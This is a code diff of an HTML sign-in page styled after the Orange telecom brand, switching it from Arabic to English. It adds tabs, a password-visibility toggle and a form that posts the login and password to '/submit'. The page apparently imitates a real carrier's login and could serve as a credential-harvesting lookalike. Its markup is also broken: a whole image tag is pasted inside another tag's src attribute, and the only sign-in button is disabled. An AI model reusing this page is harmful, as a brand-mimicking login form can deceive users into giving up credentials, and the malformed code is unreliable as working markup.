@@ -1,41 +1,66 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>تسجيل الدخول - Orange</title>
+  <title>Sign In - Orange</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <img src="orange-logo.png" alt="Orange Logo" class="logo" />
+    <img src="<img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Orange_logo.svg" alt="Orange Logo" class="logo" />
+" alt="Orange Logo" class="logo" />
 
-    <h1><strong>تسجيل الدخول إلى</strong> <span class="orange">orange</span></h1>
+    <h1 class="title">
+      Sign in to <span class="orange">orange</span>
+    </h1>
+    <p class="subtitle">to continue to your account</p>
+
+    <div class="tabs">
+      <div class="tab active">Personal</div>
+      <div class="tab">Business</div>
+    </div>
 
     <form action="/submit" method="POST">
-      <label for="login">البريد الإلكتروني أو رقم أورنج</label>
+      <label for="login">Email or Orange mobile number <span>*</span></label>
       <input
         type="text"
         id="login"
         name="login"
-        placeholder="077XXXXXXX أو mail@domain.com"
+        placeholder="mail@domain.com - or - 077XXXXXXXX"
         required
       />
 
-      <label for="password">كلمة المرور</label>
-      <input type="password" id="password" name="password" required />
+      <label for="password">Password <span>*</span></label>
+      <div class="password-field">
+        <input type="password" id="password" name="password" required />
+        <span class="toggle-eye">👁️</span>
+      </div>
 
       <div class="remember">
         <input type="checkbox" id="remember" />
-        <label for="remember">تذكرني</label>
+        <label for="remember">remember me</label>
       </div>
 
-      <a href="#" class="link">هل نسيت بيانات الدخول؟</a>
+      <a href="#" class="link">Forgot your sign in credentials?</a>
 
-      <button type="submit" class="blue-button">تسجيل الدخول</button>
+      <button class="gray-button" disabled>Sign In</button>
 
-      <a href="#" class="create">مستخدم جديد؟ أنشئ حساب</a>
+      <button class="outline-button" type="button">
+        Not A Member Create An Account
+      </button>
     </form>
   </div>
+
+  <script>
+    // Toggle eye icon functionality
+    const toggleEye = document.querySelector(".toggle-eye");
+    const passwordInput = document.getElementById("password");
+
+    toggleEye.addEventListener("click", () => {
+      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+      passwordInput.setAttribute("type", type);
+    });
+  </script>
 </body>
 </html>
